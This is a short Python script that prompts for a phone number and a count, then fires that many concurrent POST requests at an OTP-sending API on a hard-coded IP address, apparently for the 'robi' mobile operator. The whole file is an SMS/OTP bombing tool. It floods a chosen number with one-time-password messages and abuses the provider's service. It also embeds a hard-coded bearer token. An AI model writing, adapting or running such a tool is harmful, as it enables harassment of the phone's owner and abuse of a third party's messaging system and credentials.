import requests
import concurrent.futures

number = input("Number: ")
amount = int(input("Amount: "))  # Convert amount to an integer
url = 'http://103.4.145.86:6005/api/v1/user/otp/send'
headers = {
    'Authorization': 'Bearer 2Comics4mh5ln64ron5t26kpvm3toBlog',
    'Content-Type': 'application/json'
}

msisdn = str(number)  # Convert number to a string

data = {
    "msisdn": msisdn,
    "operator": "robi",
    "secret_key": ""
}

def make_request(request_number):
    try:
        response = requests.post(url, headers=headers, json=data)
        result = response.text
        print(f"[{request_number}]: {result}")
        return response.status_code, result
    except requests.RequestException as e:
        print(f"Error in network request {request_number}: {e}")
        return None, None

def run_in_executor(request_number):
    with concurrent.futures.ThreadPoolExecutor() as executor:
        status, result = executor.submit(make_request, request_number).result()

    return status, result

if __name__ == "__main__":
    try:
        # Initial request
        initial_response = make_request("Initial")

        # Concurrent requests
        with concurrent.futures.ThreadPoolExecutor(max_workers=amount) as executor:  # Use 'amount' instead of 'NUM_REQUESTS'
            futures = [executor.submit(run_in_executor, i + 1) for i in range(amount)]

            success_count = 0
            for future in concurrent.futures.as_completed(futures):
                status, result = future.result()
                if status == 200:
                    success_count += 1

            print(f"Total successful requests: {success_count}")

    except requests.RequestException as e:
        print(f"Error in initial request: {e}")